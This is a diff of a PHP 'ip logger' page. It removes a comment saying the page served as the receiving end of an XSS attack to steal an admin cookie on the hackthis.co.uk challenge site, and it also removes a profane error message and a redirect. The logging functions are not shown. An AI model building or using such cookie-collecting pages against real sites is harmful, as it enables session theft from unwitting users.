@@ -1,14 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Error 420: Fuck You | Redirecting to correct page!</title>
+	<title>ip logger</title>
 	<link rel="icon" type="images/x-icon" href="../images/favicon.ico">
 </head>
 <body>
 
 <?php
-
-// This is XSS hacking to steal admin cookie from "hackthis.co.uk". Real Level 6 is the mission :D.
 
 function GetIP() 
 { 
@@ -51,20 +49,6 @@ function logData()
 logData();
 
 ?>
-
-<?php
-
-echo "<p style='color:red'>Error 420: Fuck You!</p><br/>";
-
-echo "Redirecting in 3 seconds...<br/>";
-
-echo "<a href='https://lab.blackvikingpro.com/'>Redirection not working??!?!";
-
-?>
-
-<script>
-	setTimeout("location.href = 'https://lab.blackvikingpro.com';",2700);
-</script>
 
 </body>
 </html>
